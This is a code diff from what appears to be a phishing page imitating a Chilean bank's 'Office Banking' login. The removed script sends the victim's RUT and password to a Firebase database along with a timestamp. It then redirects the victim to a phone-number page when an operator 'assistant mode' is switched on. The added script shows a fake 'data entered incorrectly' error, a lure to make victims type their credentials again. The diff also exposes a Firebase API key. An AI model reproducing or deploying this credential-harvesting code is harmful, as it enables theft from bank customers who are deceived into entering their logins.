@@ -109,79 +109,16 @@
     </form>
   </div>
 
-  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
-      authDomain: "formulario-officebanking.firebaseapp.com",
-      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
-      projectId: "formulario-officebanking",
-      storageBucket: "formulario-officebanking.appspot.com",
-      messagingSenderId: "604053438195",
-      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
-    };
-
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    function togglePassword() {
-      const claveInput = document.getElementById('clave');
-      claveInput.type = claveInput.type === 'password' ? 'text' : 'password';
-    }
-
-    function formatearYValidarRUT(input) {
-      let raw = input.value.replace(/[^0-9kK]/g, '').toUpperCase();
-      if (raw.length < 2) {
-        input.setCustomValidity('');
-        document.getElementById('mensaje').textContent = "";
-        return;
-      }
-      const cuerpo = raw.slice(0, -1);
-      const dv = raw.slice(-1);
-      let cuerpoFmt = '';
-      for (let i = cuerpo.length - 1, j = 1; i >= 0; i--, j++) {
-        cuerpoFmt = cuerpo[i] + cuerpoFmt;
-        if (j % 3 === 0 && i !== 0) cuerpoFmt = '.' + cuerpoFmt;
-      }
-      input.value = `${cuerpoFmt}-${dv}`;
-
-      if (!validarRUT(cuerpo, dv)) {
-        input.setCustomValidity("RUT inválido");
-        document.getElementById('mensaje').textContent = "RUT inválido";
-      } else {
-        input.setCustomValidity("");
-        document.getElementById('mensaje').textContent = "";
-      }
-    }
-
-    function validarRUT(cuerpo, dv) {
-      let suma = 0;
-      let multiplo = 2;
-      for (let i = cuerpo.length - 1; i >= 0; i--) {
-        suma += parseInt(cuerpo[i]) * multiplo;
-        multiplo = multiplo < 7 ? multiplo + 1 : 2;
-      }
-      const dvEsperado = 11 - (suma % 11);
-      let dvCalc = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
-      return dv.toUpperCase() === dvCalc;
-    }
-
-    function enviarFormulario(e) {
-      e.preventDefault();
-      const rut = document.getElementById("rut").value;
-      const clave = document.getElementById("clave").value;
-      const now = new Date().toISOString();
-      const id = db.ref("usuarios").push().key;
-      db.ref("usuarios/" + id).set({ rut, clave, hora: now });
-      db.ref("estado_usuario/" + id).set({ estado: "cargando" });
-      db.ref("ultimo_usuario").set(id);
-      db.ref("modo_asistente").once("value").then(snap => {
-        if (snap.val() === true) {
-          window.location.href = "telefono.html";
-        } else {
-          window.location.href = "finalizar.html";
-        }
-      });
-    }
-  </script>
+  
+<script>
+  const params = new URLSearchParams(window.location.search);
+  if (params.get("error")) {
+    const mensajeError = document.createElement("div");
+    mensajeError.style.color = "red";
+    mensajeError.style.marginTop = "10px";
+    mensajeError.style.fontWeight = "bold";
+    mensajeError.textContent = "Datos ingresados Incorrectamente!";
+    document.querySelector("form, .contenedor, .inputs").appendChild(mensajeError);
+  }
+</script>
 </body>
-</html>
